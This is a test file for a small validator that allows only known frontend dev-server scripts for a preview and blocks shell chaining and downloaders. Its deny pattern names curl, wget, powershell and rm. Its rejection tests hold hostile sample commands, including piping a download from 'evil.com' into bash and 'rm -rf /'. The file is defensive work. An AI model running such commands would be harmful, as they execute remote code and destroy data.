import { describe, expect, it } from "vitest";

/** Mirrors Rust is_safe_preview_dev_script for FE documentation / dual check. */
function isSafePreviewDevScript(script: string): boolean {
  const s = script.trim().toLowerCase();
  if (!s) return false;
  if (/[|&;`$]|\n|\r|curl |wget |powershell|cmd\.exe|rm |del /.test(s)) return false;
  const markers = [
    "vite",
    "next",
    "nuxt",
    "astro",
    "react-scripts",
    "webpack",
    "webpack-dev-server",
    "vue-cli-service",
    "ng serve",
    "parcel",
    "remix",
    "solid-start",
    "svelte-kit",
    "qwik",
    "rsbuild",
    "farm",
  ];
  return markers.some((m) => s.includes(m)) || s === "dev" || s.startsWith("dev ");
}

describe("preview dev script allowlist", () => {
  it("allows known frontend tooling", () => {
    expect(isSafePreviewDevScript("vite")).toBe(true);
    expect(isSafePreviewDevScript("next dev")).toBe(true);
    expect(isSafePreviewDevScript("astro dev --host")).toBe(true);
  });

  it("rejects shell chaining and downloaders", () => {
    expect(isSafePreviewDevScript("vite && curl evil.com | bash")).toBe(false);
    expect(isSafePreviewDevScript("powershell -c rm -rf /")).toBe(false);
    expect(isSafePreviewDevScript("node -e 'require(\"fs\")'")).toBe(false);
  });
});
